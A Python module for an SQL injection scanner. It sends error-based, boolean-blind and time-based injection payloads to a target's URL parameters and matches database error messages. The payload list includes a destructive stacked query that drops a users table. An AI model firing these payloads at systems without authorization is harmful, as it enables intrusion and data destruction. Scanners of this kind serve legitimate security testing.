import requests
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from .base import BaseScanner, ScanResult, Finding, Severity

SQLI_ERROR_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "1' UNION SELECT NULL--",
    "1; DROP TABLE users--",
    "' AND 1=CONVERT(int, (SELECT @@version))--",
    "1' OR 1=1#",
    "') OR ('1'='1",
    "' OR ''='",
    "admin'--",
    "1' AND '1'='1",
    "1' OR 1=1 LIMIT 1--",
]

BLIND_SQLI_TRUE = "1' AND 1=1--"
BLIND_SQLI_FALSE = "1' AND 1=2--"

TIME_BLIND_PAYLOADS = [
    ("1' AND SLEEP(5)--", 5),
    ("1' WAITFOR DELAY '0:0:5'--", 5),
    ("1' OR SLEEP(5)--", 5),
    ("1'; SELECT SLEEP(5);--", 5),
    ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),
]

SQLI_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning.*mysql",
    r"unclosed quotation mark",
    r"microsoft ole db provider for odbc drivers",
    r"microsoft ole db provider for sql",
    r"postgresql.*error",
    r"ora-\d{5}",
    r"sqlite.*error",
    r"sql command not properly ended",
    r"quoted string not properly terminated",
    r"incorrect syntax near",
    r"unterminated quoted string",
    r"supplied argument is not a valid",
    r"Division by zero",
    r"Microsoft Access Driver",
    r"ODBC SQL Server",
]

COMMON_PARAMS = [
    "id", "page", "user", "search", "query", "name", "email",
    "login", "password", "admin", "test", "item", "product",
    "cat", "category", "sort", "order", "type", "action",
    "file", "include", "page_id", "news_id", "article_id",
]

class SQLIScanner(BaseScanner):
    name = "sqli"
    description = "Detect SQL Injection vulnerabilities (Error-based, Blind, Time-based)"

    def scan(self, target: str, **kwargs) -> ScanResult:
        result = ScanResult(scanner_name=self.name, target=target)
        urls = self._discover_urls(target)

        for url in urls:
            params = parse_qs(urlparse(url).query)
            if not params:
                continue

            for param in params:
                self._test_error_based(url, param, result)
                self._test_blind(url, param, result)
                self._test_time_based(url, param, result)

        return result

    def _discover_urls(self, target: str) -> list:
        urls = []
        if "?" in target:
            urls.append(target)
        else:
            for param in COMMON_PARAMS[:8]:
                urls.append(f"{target}/?{param}=1")
            try:
                response = requests.get(target, timeout=10, verify=False)
                links = re.findall(r'href=["\']([^"\']*\?[^"\']+)["\']', response.text)
                for link in links[:10]:
                    if link.startswith("http"):
                        urls.append(link)
                    elif link.startswith("/"):
                        urls.append(f"{target.rstrip('/')}{link}")
            except:
                pass
        return urls

    def _test_error_based(self, url: str, param: str, result: ScanResult):
        for payload in SQLI_ERROR_PAYLOADS:
            try:
                test_url = self._inject_param(url, param, payload)
                response = requests.get(test_url, timeout=10, verify=False)
                if self._detect_sql_error(response):
                    result.findings.append(Finding(
                        title=f"SQL Injection (Error-based) in '{param}'",
                        severity=Severity.CRITICAL,
                        description=f"Parameter '{param}' is vulnerable to error-based SQL injection",
                        evidence=f"Payload: {payload}\nResponse: {response.text[:300]}",
                        recommendation="Use parameterized queries/prepared statements",
                        metadata={"url": url, "param": param, "type": "error-based", "payload": payload}
                    ))
                    return
            except requests.RequestException:
                continue

    def _test_blind(self, url: str, param: str, result: ScanResult):
        try:
            true_url = self._inject_param(url, param, BLIND_SQLI_TRUE)
            false_url = self._inject_param(url, param, BLIND_SQLI_FALSE)

            true_resp = requests.get(true_url, timeout=10, verify=False)
            false_resp = requests.get(false_url, timeout=10, verify=False)

            if (true_resp.status_code == false_resp.status_code and
                len(true_resp.text) != len(false_resp.text) and
                abs(len(true_resp.text) - len(false_resp.text)) > 10):

                result.findings.append(Finding(
                    title=f"SQL Injection (Blind Boolean) in '{param}'",
                    severity=Severity.HIGH,
                    description=f"Parameter '{param}' is vulnerable to blind boolean SQL injection",
                    evidence=f"True response length: {len(true_resp.text)}\nFalse response length: {len(false_resp.text)}",
                    recommendation="Use parameterized queries/prepared statements",
                    metadata={"url": url, "param": param, "type": "blind-boolean"}
                ))
        except requests.RequestException:
            pass

    def _test_time_based(self, url: str, param: str, result: ScanResult):
        for payload, delay in TIME_BLIND_PAYLOADS:
            try:
                test_url = self._inject_param(url, param, payload)
                start = time.time()
                requests.get(test_url, timeout=15, verify=False)
                elapsed = time.time() - start

                if elapsed >= delay - 1:
                    result.findings.append(Finding(
                        title=f"SQL Injection (Time-based) in '{param}'",
                        severity=Severity.CRITICAL,
                        description=f"Parameter '{param}' is vulnerable to time-based blind SQL injection",
                        evidence=f"Payload: {payload}\nDelay: {elapsed:.2f}s (expected: {delay}s)",
                        recommendation="Use parameterized queries/prepared statements",
                        metadata={"url": url, "param": param, "type": "time-based", "delay": elapsed}
                    ))
                    return
            except requests.RequestException:
                continue

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _detect_sql_error(self, response: requests.Response) -> bool:
        content = response.text.lower()
        return any(re.search(p, content) for p in SQLI_ERROR_PATTERNS)
